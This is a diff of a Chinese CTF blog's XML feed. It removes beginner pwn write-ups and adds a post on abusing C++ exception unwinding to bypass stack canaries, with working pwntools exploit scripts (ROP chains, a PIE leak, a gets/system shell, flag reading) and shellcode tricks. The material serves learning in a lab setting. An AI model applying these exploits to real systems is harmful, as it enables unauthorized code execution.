-<p>这里是通过构造shellcode读取到bss段进行恶意代码执行。可以看出这里如果我们输入的字节数大于3就会直接退出程序。所以我们需要绕过strlen检测。那么strlen是如何截断的呢？是通过读取’\x00’的前的字节数来返回字节数值。于是我们可以通过构造’\x00’+shellcode来绕过。这道题还有个小坑。如果用板子asm(shellcraft.sh())去进行shellcode构造的话，这道题是做不出来的。因为这里的read读取长度限制为0xa，也就是只有10个字节，是远远小于我们用板子直接构造出来的shellcode的。所以我们需要先构造一个可以读取足够长度的read函数，再来调用，从而读入我们需要的shellcode。</p>
-<p><img src="/images/week2-4(2).png" alt="exp"></p>
-<p>这边来说一下手动构造。</p>
-<p><img src="/images/week2-4(3).png" alt="gdb"></p>
-<p>想要构造read函数，就要先控制read传参的寄存器。即rdi–fd，rsi–buf，rdx–len。在gdb调试中，可以看出，rdi&#x3D;0，而我们仍然进行了xor rdi,rdi（保险起见），就是为了让rdi&#x3D;0。rsi此时指向的地址就是bss段，所以不需要进行修改。而我们需要一个较长的读取长度。可以看到这里的r11存放着0x246就已经够了，所以用mov rdx,r11就可以将把r11中的值给rdx，至此一个读取较长长度的read函数就构造好了。最后又用到了一个nop sled的技巧，通过填充大量的nop来使执行自己的恶意代码的概率提高。</p>
-]]></content>
-      <categories>
-        <category>stack</category>
-      </categories>
-      <tags>
-        <tag>pwn入门</tag>
-      </tags>
+    <title>C++异常处理</title>
+    <url>/2026/03/26/C++%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/</url>
+    <content><![CDATA[]]></content>
   </entry>
   <entry>
-    <title>2025 0xGame Week1 Pwn</title>
-    <url>/2025/11/11/2025-0xGame-Week1-Pwn/</url>
-    <content><![CDATA[<h1 id="0xGame-Week1-Pwn"><a href="#0xGame-Week1-Pwn" class="headerlink" title="0xGame Week1 Pwn"></a>0xGame Week1 Pwn</h1><h2 id="1-Test-your-nc"><a href="#1-Test-your-nc" class="headerlink" title="1.Test your nc"></a>1.Test your nc</h2><p>简单的签到题，熟知nc的用法即可。</p>
-<p><img src="/images/week1-1(1).png" alt="图解"></p>
-<h2 id="2-命令执行"><a href="#2-命令执行" class="headerlink" title="2.命令执行"></a>2.命令执行</h2><p>同样远端连接后，可以直接获取shell，不过过滤了cat和sh指令。通过拼接就可以成功获得flag。</p>
-<p><img src="/images/week1-2(1).png" alt="图解"></p>
-<h2 id="3-Stack-overflow"><a href="#3-Stack-overflow" class="headerlink" title="3.Stack overflow"></a>3.Stack overflow</h2><p>栈溢出。先丢进ida查看，发现backdoor，却是假的，但是whhhat给出了shell。再看main函数，看到了read危险函数，并且存在溢出的机会。</p>
-<p><img src="/images/week1-3(1).png" alt="ida"></p>
-<p><img src="/images/week1-3(2).png" alt="exp"></p>
-<p>简单说一下exp，首先是对pwn工具库的一个调用，之后是对远端的连接，如果是在虚拟机上连接远端环境用remote，如果在物理机上则用connect，调试也可以用process指令。观察ida可以看出距离rbp为0x30又有0x8（64位下）的大小存放rbp，所以距离ret_addr实际上是0x38的大小，所以填充0x38的padding来使函数返回至后门函数，也就是shell的地址（在ida中找出，这里不做演示）。最后getshell。</p>
-<p><img src="/images/week1-3(3).png" alt="图解"></p>
-<h2 id="4-ROP1"><a href="#4-ROP1" class="headerlink" title="4.ROP1"></a>4.ROP1</h2><p>rop链是pwn的一种常见攻击手段，可以上网看看原理。把附件丢进ida中</p>
-<p><img src="/images/week1-4(1).png" alt="ida"></p>
-<p>可以看到有gadget函数，可以在ida中查看gadget的地址为0x40117E，也可以在bash中用指令（ROPgadget –binary “文件名” –only “pop|ret” | grep “rdi”）获得地址。</p>
-<p><img src="/images/week1-4(4).png" alt="rdi"></p>
-<p>由于在ida中找不到sh相关的字符串，于是可以从gdb中获取（当然选择在help中用偏移也是可以打通的）</p>
-<p><img src="/images/week1-4(2).png" alt="sh"></p>
-<p>从而可以构造exp</p>
-<p><img src="/images/week1-4(3).png" alt="exp"></p>
-<h5 id="由于ubuntu的版本，所以这里需要进行栈对齐，也就是payload中p64-ret-的由来。"><a href="#由于ubuntu的版本，所以这里需要进行栈对齐，也就是payload中p64-ret-的由来。" class="headerlink" title="由于ubuntu的版本，所以这里需要进行栈对齐，也就是payload中p64(ret)的由来。"></a>由于ubuntu的版本，所以这里需要进行栈对齐，也就是payload中p64(ret)的由来。</h5><p>这里的ret是任意的一个ret_addr，因为其大小为1，所以可以起到一个对齐的作用。（因为我也不完全清楚其背后的原理QAQ）</p>
-<h2 id="5-ROP2"><a href="#5-ROP2" class="headerlink" title="5.ROP2"></a>5.ROP2</h2><p>这道题的解法其实和上一道rop1类似，不过由于过滤掉了sh，bash等sh类指令，所以这边可以联想到$0这个神奇的参数也可以起到一个shell的作用。</p>
-<p><img src="/images/week1-5(1).png" alt="$0"></p>
-<p>exp如下图</p>
-<p><img src="/images/week1-5(2).png" alt="exp"></p>
-<p>week1至此结束，至于还有一道简单数学题，对python语法要求较高，我就不在此叙述。（绝对不是我菜QWQ）</p>
-]]></content>
-      <categories>
-        <category>stack</category>
-      </categories>
-      <tags>
-        <tag>pwn入门</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Gets</title>
-    <url>/2026/02/24/Gets/</url>
-    <content><![CDATA[<p>简单记录一道题，有利于帮助理解我们劫持的执行流。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE v4[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  gets(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+    <title>C++异常处理</title>
+    <url>/2026/03/26/C-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/</url>
+    <content><![CDATA[<h1 id="C-异常处理机制"><a href="#C-异常处理机制" class="headerlink" title="C++异常处理机制"></a>C++异常处理机制</h1><p><a href="https://khighl.github.io/2025/04/15/misc/">misc | Hexo</a></p>
+<p><strong>C++ 异常处理</strong>是一种在程序运行时处理错误和特殊情况的机制。它允许程序在遇到问题时，通过抛出和捕获异常来转移控制流，而不是使用传统的错误处理方法（如通过函数返回值）。C++ 异常处理主要涉及三个关键字：<em>try</em>、<em>catch</em>和<em>throw</em>。</p>
+<h5 id="核心工作机制：栈展开-Stack-Unwinding"><a href="#核心工作机制：栈展开-Stack-Unwinding" class="headerlink" title="核心工作机制：栈展开 (Stack Unwinding)"></a>核心工作机制：栈展开 (Stack Unwinding)</h5><p>这是C++异常机制中最重要的一环。当异常被 <code>throw</code> 抛出，且在当前作用域没有找到匹配的 <code>catch</code> 块时，C++ 运行时会去调用者的作用域中寻找，一直沿着函数调用栈向上找。</p>
+<p>在这个“向上找”的过程中，C++ 会<strong>自动调用当前作用域内所有已构造的局部对象的析构函数</strong>，安全地释放资源。这个过程就叫<strong>栈展开</strong>。这与 RAII（资源获取即初始化）机制完美配合，防止了内存泄漏。</p>
+<p>异常展开机制在把控制权交还给 <code>main</code> 函数时，不仅会设置 RIP，<strong>还会从栈上恢复 RBP 寄存器，以恢复 <code>main</code> 函数的栈帧环境</strong>。</p>
+<p>所以说，如果我们能伪造rbp+8的地址，让它指向一个含有c++异常处理的函数。这样做到可以绕过canary等保护。</p>
+<h2 id="第五空间-2022-toolkit"><a href="#第五空间-2022-toolkit" class="headerlink" title="[第五空间 2022]toolkit"></a><code>[第五空间 2022]toolkit</code></h2><p>链接：[<a href="https://www.nssctf.cn/problem/2619">第五空间 2022]toolkit - NSSCTF</a></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> n14593280; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  _init();</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int64, <span class="type">char</span> **))welcome)(a1, a2);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();                                   <span class="comment">// (&quot;1. Tool1&quot;);</span></span><br><span class="line">                                                <span class="comment">// (&quot;2. Tool2&quot;);</span></span><br><span class="line">                                                <span class="comment">// (&quot;3. Secret&quot;);</span></span><br><span class="line">                                                <span class="comment">// (&quot;4. Exit&quot;);</span></span><br><span class="line">      n14593280 = read__num();</span><br><span class="line">      <span class="keyword">if</span> ( n14593280 != <span class="number">0xDEAD00</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      get_pie();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( n14593280 &gt; <span class="number">0xDEAD00</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">    <span class="keyword">if</span> ( n14593280 == <span class="number">4</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( n14593280 &gt; <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_15:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;???&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> ( n14593280 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">          secret();</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">          add();</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">          sub_25B1();</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>程序本身很简单，只存在一个gets函数的调用。同时还给了system函数。</p>
+<p>菜单题，实现了对于我们输入内容的加密和解密。add()函数里实现的是base64，sub_25B1();实现了tea。</p>
+<p>这里的漏洞在于第四个子函数。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_2434</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *exception; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> n256; <span class="comment">// [rsp+Ch] [rbp-134h]</span></span><br><span class="line">  _BYTE s[<span class="number">296</span>]; <span class="comment">// [rsp+10h] [rbp-130h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+138h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x120u</span>LL);</span><br><span class="line">  <span class="built_in">memset</span>(s_0, <span class="number">0</span>, <span class="keyword">sizeof</span>(s_0));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Length: &quot;</span>);</span><br><span class="line">  n256 = read__num();</span><br><span class="line">  <span class="keyword">if</span> ( n256 &gt; <span class="number">256</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">  read_by_one_byte(s, n256);</span><br><span class="line">  <span class="built_in">memcpy</span>(s_0, s, <span class="number">0x100u</span>LL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Key: &quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(::a2, <span class="number">0</span>, <span class="keyword">sizeof</span>(::a2));</span><br><span class="line">  read_by_one_byte(::a2, <span class="number">24</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(::a2) != <span class="number">16</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    exception = __cxa_allocate_exception(<span class="number">8uLL</span>);</span><br><span class="line">    *exception = <span class="string">&quot;Error key!&quot;</span>;</span><br><span class="line">    __cxa_throw(exception, (<span class="keyword">struct</span> type_info *)&amp;`typeinfo <span class="keyword">for</span><span class="string">&#x27;char const*, 0LL);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  sub_2244(256, (__int64)::a2);</span></span><br><span class="line"><span class="string">  return __readfsqword(0x28u) ^ v4;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>由于这里<code>read_by_one_byte(s, n0x100);</code>的原因。所以就算不是unsorted int也可以写入-1来进行溢出。所以这里的n256写-1的话也是会整数溢出的。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> __fastcall <span class="title function_">read_by_one_byte</span><span class="params">(_BYTE *buf, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> ______; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(______) = a2--;                    </span><br><span class="line">    LOBYTE(______) = (_DWORD)______ != <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !(_BYTE)______ )                       <span class="comment">// n4==0时退出</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ______ = read(<span class="number">0</span>, buf, <span class="number">1uLL</span>);                <span class="comment">// 按单字节读入</span></span><br><span class="line">    <span class="keyword">if</span> ( !______ )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( ______ == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *__errno_location() != <span class="number">11</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        LODWORD(______) = *__errno_location();</span><br><span class="line">        <span class="keyword">if</span> ( (_DWORD)______ != <span class="number">4</span> )</span><br><span class="line">          <span class="keyword">return</span> ______;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *buf == <span class="number">10</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        LOBYTE(______) = (_BYTE)buf;</span><br><span class="line">        *buf = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> ______;</span><br><span class="line">      &#125;</span><br><span class="line">      ++buf;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ______;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看出如果我们写入-1，那么读取要等到____为0的时候才会停止。但是我们输入的-1是一直自减的。所以这里可以写入很多字节才会停止。</p>
+<p>由于这里存在canary保护，所以我们利用了c++异常处理来绕过。</p>
 <p>下面给出exp。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node6.anna.nssctf.cn&#x27;</span>,<span class="number">20922</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">rdi = <span class="number">0x401273</span></span><br><span class="line">bss = <span class="number">0x404040</span>+<span class="number">0x500</span></span><br><span class="line">pl = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(rdi) + p64(bss) + p64(elf.plt.gets) + p64(rdi) + p64(bss) + p64(rdi+<span class="number">1</span>) + p64(rdi+<span class="number">1</span>) + p64(elf.plt.system)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.sendline(pl)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = remote(&#x27;node4.anna.nssctf.cn&#x27;,25307)</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc =  ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;] &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">choice(<span class="number">0xdead00</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Password: &#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x210</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x210</span>)</span><br><span class="line">pie = u64(io.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00\x00&#x27;</span>) -<span class="number">0x1591</span></span><br><span class="line">success(<span class="built_in">hex</span>(pie))</span><br><span class="line">bss = pie+<span class="number">0x5060</span></span><br><span class="line">rdi = pie+<span class="number">0x2933</span></span><br><span class="line">ret = pie+<span class="number">0x25db</span></span><br><span class="line">rsi = pie+<span class="number">0x2931</span></span><br><span class="line">choice(<span class="number">2</span>)</span><br><span class="line">choice(<span class="number">2</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Length: &#x27;</span>,<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">pl = <span class="string">b&#x27;./flag&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(bss)*(<span class="built_in">int</span>(<span class="number">0x130</span>/<span class="number">8</span>)) + p64(ret) + p64(<span class="number">0xdeadbeef</span>)*<span class="number">5</span></span><br><span class="line">pl += p64(rdi+<span class="number">1</span>)+p64(rdi) + p64(bss) + p64(rsi) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(pie+<span class="number">0x1270</span>)</span><br><span class="line">pl += p64(pie+<span class="number">0x292a</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(<span class="number">3</span>) + p64(bss+<span class="number">0x100</span>) + p64(<span class="number">0x30</span>) + p64(<span class="number">0x4f60</span>+pie) + p64(pie+<span class="number">0x2910</span>)</span><br><span class="line">pl += p64(<span class="number">0</span>)*<span class="number">7</span> + p64(rdi) + p64(bss+<span class="number">0x100</span>) + p64(pie+<span class="number">0x1330</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.sendline(pl)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Key: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">17</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
-<p>这里关键不存在puts等函数的调用。所以没办法打ret2libc。</p>
-<p>这里其实难理解的是执行流。可以看我们的pl。先是构造了一个gets(bss)。这个时候执行流实际上是等待我们的输入的。也就是我们输入的&#x2F;bin&#x2F;sh\x00被写进了bss的地址。而后才是再去调用system函数。不过这里需要两次ret来栈对齐。</p>
+<p>首先，我们需要泄露出程序的基址，这样才可以得到我们想要的一些gadget。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">get_pie</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+Ch] [rbp-54h]</span></span><br><span class="line">  _QWORD buf[<span class="number">9</span>]; <span class="comment">// [rsp+10h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( unk_5010 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">64</span>);</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    read(fd, buf, <span class="number">0x30u</span>LL);</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Password: &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, (<span class="type">void</span> *)buf_0, <span class="number">0x250u</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strstr</span>(buf_0, (<span class="type">const</span> <span class="type">char</span> *)buf) )     <span class="comment">// 存在堆溢出</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Gift: %s\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)qword_5488);<span class="comment">// pie</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Your password &#x27;%s&#x27; seems wrong!\n&quot;</span>, buf_0);</span><br><span class="line">    unk_5010 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看出来，这里是撞随机数。由于这里的随机数是取自<code>/dev/urandom</code>，所以不类似于time&#x3D;0的时间种子，我们可以通过引用ctypes库来得到随机数。不过这里由于buf_0只有0x200的关系，（在init函数里定义）所以加上header，最多只有0x210。只要我们写满，就可以泄露出后面残留的内容。这里正好有pie的基址。</p>
+<p>然后就是关于c++异常处理的部分了。我们来看一下ida里函数对于c++异常处理的部分。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000000025B1 sub_25B1        proc near               ; CODE XREF: main:loc_283B↓p</span><br><span class="line">.text:00000000000025B1</span><br><span class="line">.text:00000000000025B1 var_18          = qword ptr -18h</span><br><span class="line">.text:00000000000025B1</span><br><span class="line">.text:00000000000025B1 ; __unwind &#123; // __gxx_personality_v0</span><br><span class="line">.text:00000000000025B1                 endbr64</span><br><span class="line">.text:00000000000025B5                 push    rbp</span><br><span class="line">.text:00000000000025B6                 mov     rbp, rsp</span><br><span class="line">.text:00000000000025B9                 push    rbx</span><br><span class="line">.text:00000000000025BA                 sub     rsp, 18h</span><br><span class="line">.text:00000000000025BE                 call    sub_18AB</span><br><span class="line">.text:00000000000025C3 ;   try &#123;</span><br><span class="line">.text:00000000000025C3                 call    read__num</span><br><span class="line">.text:00000000000025C8                 cmp     eax, 1</span><br><span class="line">.text:00000000000025CB                 jz      short loc_25D4</span><br><span class="line">.text:00000000000025CD                 cmp     eax, 2</span><br><span class="line">.text:00000000000025D0                 jz      short loc_25DB</span><br><span class="line">.text:00000000000025D2                 jmp     short loc_264A</span><br><span class="line">.text:00000000000025D4 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000000025D4</span><br><span class="line">.text:00000000000025D4 loc_25D4:                               ; CODE XREF: sub_25B1+1A↑j</span><br><span class="line">.text:00000000000025D4                 call    sub_22B6</span><br><span class="line">.text:00000000000025D9                 jmp     short loc_25E1</span><br><span class="line">.text:00000000000025DB ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000000025DB</span><br><span class="line">.text:00000000000025DB loc_25DB:                               ; CODE XREF: sub_25B1+1F↑j</span><br><span class="line">.text:00000000000025DB                call    sub_2434</span><br><span class="line">.text:00000000000025DB ;   &#125; // starts at 25C3</span><br><span class="line">.text:00000000000025E0                 nop</span><br><span class="line">.text:00000000000025E1</span><br><span class="line">.text:00000000000025E1 loc_25E1:                               ; CODE XREF: sub_25B1+28↑j</span><br><span class="line">.text:00000000000025E1                 jmp     short loc_264A</span><br><span class="line">.text:00000000000025E3 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000000025E3 ;   catch(char const*) // owned by 25C3</span><br><span class="line">.text:00000000000025E3                 endbr64</span><br><span class="line">.text:00000000000025E7                 cmp     rdx, 1</span><br><span class="line">.text:00000000000025EB                 jz      short loc_25F5</span><br><span class="line">.text:00000000000025ED                 mov     rdi, rax        ; struct _Unwind_Exception *</span><br><span class="line">.text:00000000000025F0                 call    __Unwind_Resume</span><br><span class="line">.text:00000000000025F5 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000000025F5</span><br><span class="line">.text:00000000000025F5 loc_25F5:                               ; CODE XREF: sub_25B1+3A↑j</span><br><span class="line">.text:00000000000025F5                 mov     rdi, rax        ; void *</span><br><span class="line">.text:00000000000025F8                 call    ___cxa_begin_catch</span><br><span class="line">.text:00000000000025FD                 mov     [rbp+var_18], rax</span><br><span class="line">.text:0000000000002601                 mov     rax, [rbp+var_18]</span><br><span class="line">.text:0000000000002605                 mov     rsi, rax</span><br><span class="line">.text:0000000000002608                 mov     rax, cs:_ZSt4cerr_ptr</span><br><span class="line">.text:000000000000260F                 mov     rdi, rax</span><br><span class="line">.text:0000000000002612 ;   try &#123;</span><br><span class="line">.text:0000000000002612                 call    __ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc ; std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(std::ostream &amp;,char const*)</span><br><span class="line">.text:0000000000002617                 mov     rdx, rax</span><br><span class="line">.text:000000000000261A                 mov     rax, cs:_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6__ptr</span><br><span class="line">.text:0000000000002621                 mov     rsi, rax</span><br><span class="line">.text:0000000000002624                 mov     rdi, rdx</span><br><span class="line">.text:0000000000002627                 call    __ZNSolsEPFRSoS_E ; std::ostream::operator&lt;&lt;(std::ostream &amp; (*)(std::ostream &amp;))</span><br><span class="line">.text:0000000000002627 ;   &#125; // starts at 2612</span><br><span class="line">.text:000000000000262C                 call    ___cxa_end_catch</span><br><span class="line">.text:0000000000002631                 jmp     short loc_264A</span><br><span class="line">.text:0000000000002633 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000002633 ;   cleanup() // owned by 2612</span><br><span class="line">.text:0000000000002633                 endbr64</span><br><span class="line">.text:0000000000002637                 mov     rbx, rax</span><br><span class="line">.text:000000000000263A                 call    ___cxa_end_catch</span><br><span class="line">.text:000000000000263F                 mov     rax, rbx</span><br><span class="line">.text:0000000000002642                 mov     rdi, rax        ; struct _Unwind_Exception *</span><br><span class="line">.text:0000000000002645                 call    __Unwind_Resume</span><br><span class="line">.text:000000000000264A ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000000264A</span><br><span class="line">.text:000000000000264A loc_264A:                               ; CODE XREF: sub_25B1+21↑j</span><br><span class="line">.text:000000000000264A                                         ; sub_25B1:loc_25E1↑j ...</span><br><span class="line">.text:000000000000264A                 add     rsp, 18h</span><br><span class="line">.text:000000000000264E                 pop     rbx</span><br><span class="line">.text:000000000000264F                 pop     rbp</span><br><span class="line">.text:0000000000002650                 retn</span><br><span class="line">.text:0000000000002650 ; &#125; // starts at 25B1</span><br><span class="line">.text:0000000000002650 sub_25B1        endp</span><br><span class="line">.text:0000000000002650</span><br></pre></td></tr></table></figure>
+
+<p>由于我们在0x2434，输入key字段的时候，触发了c++异常处理，所以此时会回到0x2434的父函数，也就是0x25b1去处理。</p>
+<p>可以看到，我们填的ret函数是0x25db，是因为当我们执行0x2434，也就是去<code>call sub_2434</code>后，下一条指令会被压入栈中，应该是这里的0x25d9，不过由于0x25d9和0x25db都在try{}块中，所以都会被视作是合法的，就会正常进行catch{}块。我们可以看到catch{}块中去判断了抛出错误的类型是不是char类型的。由于抛出的是error key，所以这里会跳转到<code>loc_25f5</code>，然后最后跳转到<code>loc_264a</code>会执行40字节的一些操作(0x18+0x8+0x8&#x3D;0x28)。所以我们会填入p64(0xdeadbeef)*5，这样等恢复完寄存器，执行ret步骤的时候就刚刚好是我们的rop链的起始地址了。</p>
